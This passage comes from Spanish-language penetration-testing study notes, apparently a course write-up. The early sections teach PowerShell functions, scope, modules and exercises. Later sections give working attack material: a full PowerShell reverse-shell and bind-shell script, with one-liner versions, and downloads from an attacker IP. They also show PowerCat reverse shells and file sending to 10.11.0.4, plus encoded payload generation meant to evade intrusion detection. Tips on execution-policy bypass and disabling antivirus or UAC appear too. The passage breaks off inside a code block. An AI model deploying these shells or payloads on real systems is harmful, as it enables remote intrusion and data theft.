PS C:\Windows\system32> function <functionname> {
 
  <code>

}
```

<br />

```powershell
PS C:\Windows\system32> function Get-MajMinorVersion {
  $PSVersionTable.PSVersion.Major.ToString()+"."+$PSVersionTable.PSVersion.Minor.ToString()
}

PS C:\Windows\system32> Get-MajMinorVersion
5.1
```

<br />

**Scope modifiers**

El scope o alcance de una variable determina hasta qué punto existe una variable en un código. Existen variables que sólo tienen valor o existencia dentro de un bloque de código y tienen alcance local y existen variables que existen en todo el código y que tienen por tanto un alcance global.

Así por ejemplo podemos usar los términos Global o Local para determinar el alcance de una variable que creemos:

```powershell
PS C:\Windows\system32> $Global:outsideVariable = "outside"

PS C:\Windows\system32> function Set-PSInsideVar
{
  $Local:insideVariable = "inside"
  Write-Output $insideVariable
}
```

La sintaxis por tanto es:

```powershell
$<scope-modifier>:<name> = <value>
```

Así, observamos que la variable local no existe fuera del bloque de código de la función.

```powershell
PS C:\Windows\system32> Write-Output $outsideVariable
outside

PS C:\Windows\system32> Set-PSInsideVar
inside

PS C:\Windows\system32> Write-Output $insideVariable

PS C:\Windows\system32>
```

<br />

**Get-Variable**

Podemos identificar todas las variables, locales o globales con Get-Variable:

```powershell
PS C:\Windows\system32> Get-Variable -Scope Global -Name outsideVariable

Name                                Value
----                                _____
outsideVariable                      outside

PS C:\Windows\system32> Get-Variable -Scope Global -Name insideVariable
Get-Variable : Cannot find a variable with the name 'insideVariable'.
At line:1 char:1
+ Get-Variable -Scope Global -Name insideVariable
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (insideVariable:string) [Get-Variable], ItemNotFoundExepction
    + FullyQualifiedErrorID : VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand

PS C:\Windows\system32> Get-Variable -Scope Local -Name insideVariable
Get-Variable : Cannot find a variable with the name 'insideVariable'.
At line:1 char:1
+ Get-Variable -Scope Local -Name insideVariable
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (insideVariable:string) [Get-Variable], ItemNotFoundExepction
    + FullyQualifiedErrorID : VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand

```

Observamos que, aunque intentamos buscar una variable local, esta no existe y por tanto no puede ser encontrada a noser que se busque desde el bloque de código en el que fue creada:

```powershell
PS C:\Windows\system32> function Set-PSInsideVar
{
  $Local:insideVariable = "inside"
  Write-Output $insideVariable
  Get-Variable -Scope Local -Name insideVariable
}

PS C:\Windows\system32> Set-PSInsideVar
inside

Name                                Value
----                                _____
insideVariable                       inside
```

<br />

**Parámetros de las funciones**

Las funciones pueden ser llamadas juntos con parámetros, estos son valores que se añaden al código de la función de forma externa y que generalmente varian el comportamiento y resultado de la función.

Hay dos formas de definir los parámetros de una función:

```powershell
function <name>
{
  param ([type]$parameter1, [type]$parameter2)
  <actions>
}

function <name> ([type]$parameter1, [type]$parameter2)
{
  <actions>
}
```

Por ejemplo:

```powershell
PS C:\Windows\system32> function Get-PSMultiplication
{
  param ([int]$num1, [int]$num2)
  return $num1*$num2
}

PS C:\Windows\system32> Get-PSMultiplication 2 10
20
```

En cualquier caso, a la hora de llamar a una función, los parámetros siempre se introducen como argumentos a la hora de llamarla.

<br />

**Ejercicios**

Sobre el siguente bloque de código:

```
function Get-PSMath
{
  param ([int]$num1, [int]$num2, [string]$str1)
  if($str1 -eq "*")
  {
    return $num1*$num2
  }
  else if($str1 -eq "+")
  {
    return $num1+$num2
  }
  else if($str1 -eq "/")
  {
    return $num1/$num2
  }
  else if($str1 -eq "-")
  {
    return $num1-$num2
  }
  else
  {
    break
  }
}
```

¿Cuántos parámetros contiene la función anterior?: 3
¿Qué generará el siguiente comando, Get-PSMath 2 10 +, Get-PSMath 10 5 !?: 12, una línea en blanco.

<br />

##### 4.9. Scripts, Modulos.

**Definición y política de restricción.**

Los scripts en powershell son ficheros *.ps1*. PowerShell mantiene una política de restricción en contra de la ejecución de scripts como medida de seguridad.

Podemos ver el status de esta medida con el siguiente comando:

```powershell
PS C:\Users\User> Get-ExecutionPolicy
Restricted
```

<br />

```powershell
PS C:\Users\User> C:\Users\User\Desktop\computerInfo.ps1
C:\Users\User\Desktop\computerInfo.ps1 : File C:\Users\User\Desktop\computerInfo.ps1 cannot be loaded
because running scripts is disabled on this system. For more information, see about_Execution_Policies at
https:/go.microsoft.com/fwlink/?LinkID=135170.
```

Generalmente esta configuración no se puede cambiar a no ser que seamos administradores. Sin embargo, existen otras configuraciones y comandos que nos pueden introducir:

```powershell
PS C:\Users\vandelay> powershell.exe -exec bypass C:\Users\vandelay\Desktop\computerInfo.ps1
```

<br />

**Comentarios**

Los comentarios se indican con un hastag '#'. 

```powershell
# This is a single line comment. The interpreter will ignore this comment.

<#
  This is a multi-line comment or a comment code block.
  Every line within this section will be ignored by the interpreter
#>

# The following function takes in two integers (num1 and num2) as input, multiplies them together, and outputs the total.

function Get-PSMultiplication
{
  param ([int]$num1, [int]$num2)
  return $num1*num2
}
```

<br />

**Modulos**

Los módulos de PowerShell son esencialmente paquetes que contienes cmdlets adicionales, funciones, providers, etc. Estos son generalmente importados a una sesión concreta de PowerShell dando acceso al usuario a nueva funcionalidad.

Una forma de listar los modulos es con *Get-Module*:

```powershell
PS C:\Windows\system32> Get-Module -ListAvailable

    Directory: C:\Program Files\WindowsPowerShell\Modules

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     1.0.1      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}
Binary     1.0.0.1    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packa...
Script     3.4.0      Pester                              {Describe, Context, It, Should...}
Script     1.0.0.1    PowerShellGet                       {Install-Module, Find-Module, Save-Module, Update-Module...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Set-PSReadLineKeyHandler, Remov...

    Directory: C:\Windows\system32\WindowsPowerShell\v1.0\Modules

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.0.0    AppBackgroundTask                   {Disable-AppBackgroundTaskDiagnosticLog, Enable-AppBackgro...
Manifest   2.0.0.0    AppLocker                           {Get-AppLockerFileInformation, Get-AppLockerPolicy, New-Ap...
Manifest   1.0.0.0    AppvClient                          {Add-AppvClientConnectionGroup, Add-AppvClientPackage, Add...
Manifest   2.0.1.0    Appx                                {Add-AppxPackage, Get-AppxPackage, Get-AppxPackageManifest...
Script     1.0.0.0    AssignedAccess                      {Clear-AssignedAccess, Get-AssignedAccess, Set-AssignedAcc...
...
```

<br />

**Get-Command**

Una vez hemos importado un modulo, hemos adquirido nuevas funcionalidades como comandos, etc. Podemos ver estas nuevas funcionalidades con *Get-Command*

```powershell
PS C:\Windows\system32> Get-Command -Module Defender

CommandType     Name                          Version    Source
-----------     ----                          -------    ------
Function        Add-MpPreference              1.0        defender
Function        Get-MpComputerStatus          1.0        defender
Function        Get-MpPreference              1.0        defender
Function        Get-MpThreat                  1.0        defender
Function        Get-MpThreatCatalog           1.0        defender
Function        Get-MpThreatDetection         1.0        defender
Function        Remove-MpPreference           1.0        defender
Function        Remove-MpThreat               1.0        defender
Function        Set-MpPreference              1.0        defender
Function        Start-MpScan                  1.0        defender
Function        Start-MpWDOScan               1.0        defender
Function        Update-MpSignature            1.0        defender
```

<br />

**Exercises**

¿Cuál es la primera función listada alfabéticamente disponible a través del módulo BitLocker?:

Import-Module BitLocker; Get-Command -Module BitLocker

Add-BitLockerKeyProtector

<br />

¿Cuál es la primera entrada después de ejecutar Get-ChildItem en el proveedor de certificados en LocalMachine?

```powershell
cd Cert:\LocalMachine\; Get-ChildItem
```

TestSignRoot

<br />

¿Qué cmdlet podríamos usar para que PowerShell lea en un archivo CSV (valores separados por comas)?

Import-CSV

<br />

##### 4.10. Challenge Exercises.

**Las credenciales de inicio de sesión automático a veces se pueden almacenar en ciertos lugares dentro del disco duro. Como operador ofensivo, esta es una excelente manera de obtener persistencia. Encuentre todas las credenciales de inicio de sesión automático obteniendo la propiedad del elemento de "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" y mostrando los valores "DefaultDomainName" y "DefaultUserName".**

Como vemos en el enunciado, existen credenciales de autologeo, estas credenciales permiten al usuario que tiene propiedad sobre ellas logearse en el equipo sin necesidad de autenticarse. 

Tal y como comenta el enunciado, podemos tener acceso a todas estas claves utilizando el cmdlet Get-ItemProperty sobre Winlogon en el registro clave de la máquina local o HKLM:

```powershell
Get-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object -Property DefaultDomainName,DefaultUserName,PSDrive
```

Como el output no despliega ningún usuario en ningún dominio, asumimos que esta máquina no tiene claves de autologeo.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211012345.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Encontrar los SID del usuario puede ser una buena información por varias razones. Utilice PowerShell para encontrar el SID del administrador. Asegúrate de incluir toda la cadena.**

El SID es un identificador de seguridad, un número que se asigna a cada usuario en la máquina windows. Se trata por tanto de una propiedad de un usuario local y para acceder a ella vamos a utilizar el cmdlet *Get-LocalUser*; este es un cmdlet que permite acceder a los objetos usuarios locales de la máquina:

```powershell
Get-LocalUser -Name "Administrator" | Select-Object -Property Name,SID
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211013102.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Identificar si un antivirus está instalado y qué versiones son es una habilidad crucial como operador ofensivo. Desde el lado defensivo o administrativo, es una buena información que ayuda a identificar brechas de seguridad. ¿Cuál es el estado del producto del antivirus instalado?**

Para este ejercicio vamos a utilizar el cmdlet Get-CIMInstance. Este es un cmdlet que extrae información sobre un servidor CIM (Common Information Model), este último es un modelo de datos orientado a objetos que con frecuencia contiene información de distintas partes de un sistema o una empresa como por ejemplo un antivirus, que puede ser software interno o de terceros.

El CIM se organiza por su parte en 'namespace', los cuales son directorios lógicos organizados en un sistema de ficheros.

```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

En el comando anterior podemos ver por tanto que estamos buscando en root/SecurityCenter2 la clase AntivirusProduct:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211015927.png' | relative_url }}" text-align="center"/>
</div>

<br />

**En formato de tabla, muestre los procesos e incluya CommandLine, ProcessName y SessionID. Filtre para mostrar SessionID de 2 y ProcessName de "svchost.exe" solamente. Ordene los resultados alfabéticamente por CommandLine. La primera fila tendrá un comando "SvcGroup" diferente. Envíe el valor completo de la propiedad CommandLine de ese proceso.**

En primer lugar, podemos intentar utilizar el cmdlet Get-Process, a la vista de que este lista los procesos del sistema

```powershell
Get-Process | Select-Object CommandLine,SessionID,ProcessName | Where-Object {$_.SessionID -eq 2 -And $_.ProcessName -eq "svchost"} | Sort-Object -Property CommandLine -Descending
```

Esta, en teoría lista todos los procesos, segudamente selecciona las propiedades CommandLine, SessionID y ProcessName, seguidamente, se queda con aquellas lineas donde Session ID coincida con 2 y ProcessName coincida con "svchost" y ordena por orden alfabéticamente descendente las líneas a partir de la propiedad CommandLine. 

Sin embargo, esta línea no despliega un output que contenga CommandLine:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211121243.png' | relative_url }}" text-align="center"/>
</div>

Así, tenemos que buscar otra forma de listar los procesos. Buscando en internet podemos encontrar que el CmdLet, Get-CimInstance Win32_Process lista todos los procesos del sistema:

```powershell
Get-CimInstance Win32_Process | Select-Object CommandLine,SessionID,ProcessName | Where-Object {$_.SessionId -eq 2 -and $_.ProcessName -eq "svchost.exe"} | Sort-Object -Property CommandLine -Descending
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211122437.png' | relative_url }}" text-align="center"/>
</div>

Como está organizado de forma descendente, el comando pedido es el último.

<br />

**Cuente la cantidad de tareas programadas con la ruta del directorio "\\Microsoft" (para incluir todos los subdirectorios) y en el state "Ready".**

Para este ejercicio vamos a utillizar Get-ScheduledTask que muestra todas las tareas automatizadas que hay en el registro. Para ello empleamos el siguente comando:

```powershell
Get-ScheduledTask -TaskPath "\Microsoft*" | Where-Object -Property State -eq "Ready" | Measure-Object -Line
```

Este lista todos los ScheduledTask que empiezen por \\Microsoft (el asterisco es un término que se utiliza para designar que después puede ir cualquier cosa) y después se queda con todos aquellos que tengan el status "Ready" y por último cuenta las líneas. 

Es importante ejecutar el comando como adminstrador ya que como el cmdlet trabaja con los permisos del usuario que lo lanza, es probable que haya secciones del registro al que un usuario normal no pueda acceder y que por tanto queden tareas sin listar.

<br />

**Los servicios con rutas ejecutables sin comillas que se inician automáticamente pueden dar lugar a una escalada de privilegios. ¿Cuántos servicios se ajustan a esa descripción en esta máquina?**

En principio intentamos listar servicios con Get-Service pero este no muestra ninguna propiedad relacionada con un binario ejecutable o algo parecido.

Así , probamos a utilizar el cmdlet Get-WmiObject el cual nos permite listar objetos pertenicientes a una determinada clase, entre las clases listables se encuentra Win32_Service. Primero, listamos todas las propiedades de los objetos con:

```powershell
Get-WmiObject Win32-Service | Select-Object -Property *
```

Observamos que entre las propiedades que se listan hay una que se denomina "PathName" y que tiene elpath al ejecutable del servicio. Despúes de realizar diversas pruebas el comando a emplear es:

```powershell
Get-WmiObject Win32_Service | Select-Object Name,StartMode,PathName | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -NotMatch '"'} | Measure-Object 
```

Este comando lista los servicios de windows, muestra las propiedaes Name, StartMode, PathName pero filtra todo lo que no coincida con StartMode = Auto y todo aquello que tenga comillas.

<br />

**Con los resultados de la pregunta 6 (antes de contar los objetos), ajuste su solución agregando las propiedades Name y DisplayName, y ordene los resultados alfabéticamente en orden descendente según la propiedad "Name". La respuesta son los valores de las propiedades First Name y DisplayName del servicio que comienzan con la letra "p".**

Ajustamos el comando anterior para que quede como sigue:

```powershell
Get-WmiObject Win32_Service | Select-Object Name,DisplayName,StartMode,PathName | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -NotMatch '"'} | Sort-Object -Property Name -Descending
```

Este comando es similar al anterior salvo que muestra también la propiedad DisplayName y ordena los elementos alfábéticamente descendiente, el primer servicio que tiene en común que Name y Display Name empieza por 'p' es Power. Por tanto la respuesta es Power,Power.

<br />

**Hay un usuario que inició sesión. Use PowerShell para encontrar el valor de PrimaryOwnerName del usuario.**

Podemos listar la clase Win32_ComputerSystem que lista los ordenadores que están conectados al sistema, al lista todas las propiedades obtenemos:

```powershell
Get-CimInstance -ClassName Win32_ComputerSystem
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211181026.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Obtener hashes de archivos es extremadamente importante para defensores y analistas forenses. Hay un archivo ubicado en C:\\Windows\\System32 (no subdirectorios) con un hash MD5 de "6CECC33A62E935F5E8665B9597479A36". ¿Cuál es el nombre del archivo (incluya la extensión)?**

Para desarrollar esta tarea vamos a utilizar el siguiente script:

```powershell
$Files=$(Get-ChildItem | Where-Object { ! $_.PSIsContainer } | Select-Object -ExpandProperty Name) 

$Flaghash="6CECC33A62E935F5E8665B9597479A36"

for ($i=0; $i -le $Files.Length; $i++){
    $File=$files[$i]
    $Path="C:\WINDOWS\system32\"+$File
    $Hash=$(Get-FileHash $Path -Algorithm MD5 | Select-Object -ExpandProperty Hash )	
	if ($Hash -eq $Flaghash){
		$Files[$i] 
	}
	else
	{}
}
```

Veámos línea a línea lo que hace el script.

- La primera línea guarda en una variable el resultado de un comando que lista los contenidos del directorio actual, desecha los subdirectorios, y se queda con el string asociado al valor de la propiedad Name del fichero (es decir, crea una variable array que contiene los nombres de los ficheros del directorio actual). Especialemente relevante es el término -ExpandProperty que nos permite quedarnos sólo con el string, en lugar de quedarnos con la propiedad Name solamente como ocurriría con -Property solamente. Esto imposibilitaria la construcción del path que vamos a hacer acontinuación.

- La segunda línea guarda en una variable el contenido del fichero cuyo nombre queremos.

- La tercera implementa el inicio de un bucle for que esencialmente construye un path para cada nombre del fichero contenido en el array anterior y extrae el hash del contenido de dicho fichero y compara este hash con nuestra flag. Si hay un match despliega el nombre del fichero que es lo que pide el ejercicio. Observemos que para comprar los hashes hemos vuelto a utilizar -ExpandProperty y que para formar el path hemos utilizado el operador '+' con dos strings.

<br />

**Consultar archivos en busca de cadenas o caracteres es una habilidad invaluable que se puede aplicar en una variedad de campos dentro de la seguridad de la información y la informática en general. Hay un archivo .txt ubicado en C:\\Windows\\System32 (incluye subdirectorios) que contiene la cadena "contraseña". Encuentre el archivo y recupere el contenido del archivo para obtener la bandera. Según el comando, puede tardar uno o dos minutos. Si lleva más de tres minutos, deberíamos considerar volver a evaluar nuestra solución.**

Para realizar esta tarea vamos a utilizar el siguiente script:

```powershell
$Files=$(Get-ChildItem | Where-Object { $_.Name -match "txt" } | Select-Object -ExpandProperty Name) 

for ($i=0; $i -lt $files.Length; $i++){
    $File=$Files[$i]
    $Path="C:\WINDOWS\system32\"+$File
    $Pattern=$(Get-Content $Path | Select-String -Pattern "password" )	
	if ($Pattern -ne $null){
		"[+] " + $Path + ": " + $(type $Path | Select-String -Pattern "password")
	}
	else
	{}
}
```

Este es producto de una reutilización del código del ejercicio anterior. De nuevo, vamos a desgranar el script línea a línea.

- La primera línea crea un array con los nombres de los ficheros que contienen el término 'txt' en el nombre. De nuevo, utilizamos el -ExpandProperty para quedarnos con el string del nombre en lugar de con la propiedad Name.

- La siguiente línea forma un bucle for que, para cada nombre, forma la ruta hasta el fichero y seguidamente busca entre sus contenidos el patrón 'password' y lo almacena en una variable. Si encuentra un match, la variable no estará vacía y nos dará la línea en la que a encontrado el match.

<br />

### 5. PowerShell & PowerCat.

Windows PowerShell es un lenguaje orientado al scripting y a la realización de tareas de sistema operativo. Esta específicamente diseñado para administradores para automatizar tareas de administración de objetos o servicios en Windows.

Está instalado por defecto en las máquinas Windows a partir del Windows Server 2008 y Windows 7.

*Es importante conocer que PowerShell tiene una característica que define qué tipo de script de powershell se puede ejecutar en el sistema si es que se puede ejecutar alguno*. Por defecto, esta política es "Restricted", esto significa que el sistema no ejecutará scripts de PowerShell ni cargará archivos de configuración de PowerShell.

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221208121508.png' | relative_url }}" text-align="center"/>
</div>

Para poder ejecutar scripts de PowerShell necesitamos setear esta configuración a "Unrestricted", para ello necesitamos permisos de administrador por lo que necesitaremos abrir la CMD con permisos de admin:

```cmd
Windows PowerShell
Copyright  (C) Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing 
the execution policy might expose you to the security risks described in the 
about_Execution_Policies help topic at https:/go.microsoft.com/fwlink/?LinkID=135170. 
Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): y

PS C:\WINDOWS\system32> Get-ExecutionPolicy
Unrestricted
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221208121644.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221208121911.png' | relative_url }}" text-align="center"/>
</div>

Veámos ahora tareas útiles que podemos desempeñar mediante PowerShell.

<br />

#### 5.1. PowerShell File Transfer.

El comando que vamos a emplear para transferir el fichero es el siguiente:

```cmd
C:\Users\offsec> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

Observemos que es un comando de powershell que lanzamos desde la CMD y por tanto utilizamos el término 'powershell -c' para lanza el subsequente comando que lanza una HTTP request sobre un servidor Web para recoger un fichero en el directorio root del mismo:.

Supongámos, que tenemos un servidor web activo en el que tenemos un fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221208162232.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221208162257.png' | relative_url }}" text-align="center"/>
</div>

Como vemos hemos obtenido el fichero del servidor web. El comando consta de un objeto (que invocamos con new-object) del tipo WebClient sobre el que utilizamos un método del objeto, DonwloadFile, en el que especificamos el path de descarga y el path de guardado del fichero. 

Seguidamente, comprobamos el contenido del fichero para cerciorarnos de la validez de la transferencia.

También podemos descargar un fichero utilizando wget o el siguiente comando:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <path>
```

<br />

#### 5.2. PowerShell Reverse Shells.

En esta sección vamos a aprender a ejecutar de forma manual una reverse shell escrita en PowerShell. 

Por un lado, en la máquina local, la máquina atacante debemos de dejar escuchando un listener por ejemplo en netcat:

```powershell
sudo nc -lvnp 443
```

En la máquina remota, supuestamente Windows que ejecute powershell y ejecutamos el siguiente código:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

Este código regula el envío y el recibo de bytes sobre una IP y un puerto. 

Concretamente, emplea varios objetos para, en un bucle que se repite indefinidamente hasta que se envía una señal de aborto, se recoge input del usuario, se introduce en un buffer de bytes y se envía sobre la víctima. Seguidamente se espera el stream de bytes de la respuesta de la víctima, se muestra por pantalla y se vuelve a esperar el input del usuario para volver a devolverlo.

Puede ser ejecutado en una sóla línea:

```powershell
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Sin embargo más adelante se comprobará que este método es un poco arcaico pues no se puede hacer ejecutar el comando anterior en una máquina Windows moderna que tenga un producto antivirus activado. Con lo que antes de realizar esto es necesario tener los privilegios suficientes en el sistema como para desactivar el antivirus antes de intentar correr manualmente este código.

<br />

#### 5.3. PowerShell Bind Shells.

De forma análoga al código que producía una reverse shell manual tenemos el siguiente código:

```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){

	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}
$client.Close();
$listener.Stop();
```

El cual de nuevo se puede implementar en una sóla línea. Este código como bien sabemos debe enviarse desde la máquina atacante:

```powershell
C:\Users\offsec> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

Este comando escucha peticiones que luego transfiere a un programa de administración remota, observemos que la IP es 0.0.0.0 por que necesitamos qu escuche tanto internamente como externamente. 

Seguidamente, desde la máquina atacante simplemente realizamos una conexión con netcat:

```bash
kali@kali:~$ nc -nv 10.11.0.22 443
(UNKNOWN) [10.11.0.22] 443 (https) open
ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.11.0.22
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.11.0.1

```

Sin embargo, y al igual que ocurría con el ReverseShell, este es un intento un poco torpe de establecer una conexión pues más adelante comprobaremos que la conexión quedaría bloqueada por el Firewall de Windows al margen de otros problemas como el UAC y similares. Con lo que antes de correr el código es necesario tener los privilegios/recursos suficientes como para poder desactivar el firewall y poder hacer un bypass al UAC en la máquina a la que se va a conectar.

<br />

#### 5.4. PowerCat.

[PowerCat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) es esencialmente una version de Netcat escrita por besimorhino. Básicamente se trata de un script que podemos descargar sobre un host de Windows para elevar la fuerza de PowerShell y simplificar la creación de bind/reverse shells.

PowerCat también está disponible en kali desde la apt.

De esta forma, transferimos el fichero desde la Kali a la máquina Windows ya sea con Socat, Netcat o Powershell y seguidamente ejecutamos el script con una característica de PowerShell conocida como *Dot-sourcing*: 

```powershell
PS C:\Users\Offsec> . .\powercat.ps1
```

Esto incluirá en la sesión actual de powershell todas las funciones y variables definidas en el script, como si importarámos un módulo. Debemos observar que esto sólo actúa sobre la sesión actual de PowerShell.

Una vez hemos ejecutado el script tenemos acceso a nuevas funcionalidades entre las que se encuentran aquellas que otorga el comando 'powercat':

```powershell
PS C:\Users\offsec> powercat -h
powercat - Netcat, The Powershell Version
Github Repository: https://github.com/besimorhino/powercat

This script attempts to implement the features of netcat in a powershell
script. It also contains extra features such as built-in relays, execute
powershell, and a dnscat2 client.

Usage: powercat [-c or -l] [-p port] [options]

  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                  If you are using -dns, specify the DNS Server to send queries to.

  -l              Listen Mode. Start a listener on the port specified by -p.

  -p  <port>      Port. The port to connect to, or the port to listen on.

  -e  <proc>      Execute. Specify the name of the process to start.
...
  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection
                  established. Used for moving files. You can provide the path to a fi
                  a byte array object, or a string. You can also pipe any of those int
                  powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80
...
  -g              Generate Payload.  Returns a script as a string which will execute t
                  powercat with the options you have specified. -i, -d, and -rep will 
                  be incorporated.

  -ge             Generate Encoded Payload. Does the same as -g, but returns a string 
                  can be executed in this way: powershell -E <encoded string>

  -h              Print this help message.
...
```

<br />

#### 5.5. PowerCat File Transfers.

Con Powercat podemos enviar ficheros:

```powershell
PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

El comando anterior de powershell utiliza la utilidad powercat con el parámetro '-c'   para especificar el modo cliente y conectarse al servidor especificicando la IP, el puerto y el fichero a transferir.

En la máquina remota habrá un servudir de netcat recibiendo el fichero:

```bash
kali@kali:~$ sudo nc -lnvp 443 > receiving_powercat.ps1
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63661
```

<br />

#### 5.6. Powercat Shells.

**Reverse Shell**

Máquina atacante:

```bash
kali@kali:~$ sudo nc -lvp 443
listening on [any] 443 ...
```

Máquina víctima:

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

<br />

**BindShell**

Máquina víctima:

```powershell
PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
```

<br />

Máquina atacante:

```bash
kali@kali:~$ nc 10.11.0.22 443
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```

<br />



#### 5.7. Powercat Stand-Alone Payloads.

Powercat también tiene la interesante habilidad de generar 'stand-alone payloads'.

Por ejemplo; 

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
```

Este comando es similar al comando que genera una reverse shell salvo por el parámetro '-g'. Este parámetro indica a powercat que no queremos la ejecución del comando en sí, sino que queremos que se construya un script con él para que cualquiera que lo ejecute sea capaz de generar una reverse shell hacia un host siempre y cuando sea ejecutado en una máquina Windows.

Este script es lo que se denomina como 'payload'. En este caso concretamente definimos un payload consistente en una reverse shell de cara a la IP 10.11.0.4 en el puerto 443 y cada vez que el script sea ejecutado enviará una conexión de administración remota a dicha IP en dicho puerto. Se trata de una funcionalidad muy parecida aunque menos flexible (exclusiva para sistemas Windows) de la conocida herramienta del entorno de metasploit; MSFVenom. 

Además, Powercar incluye la capcidad de ofuscar el payload para hacerlo menos visible de cara a herramientas de detección/prevención de intrusos (IDS/IPS) a través del parámetro '-e':

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```

De esta forma se generará un script como en el caso anterior pero estará codificado y deberá ejecutarse desde powershell con la opción -E (endodedcommand):

```powershell
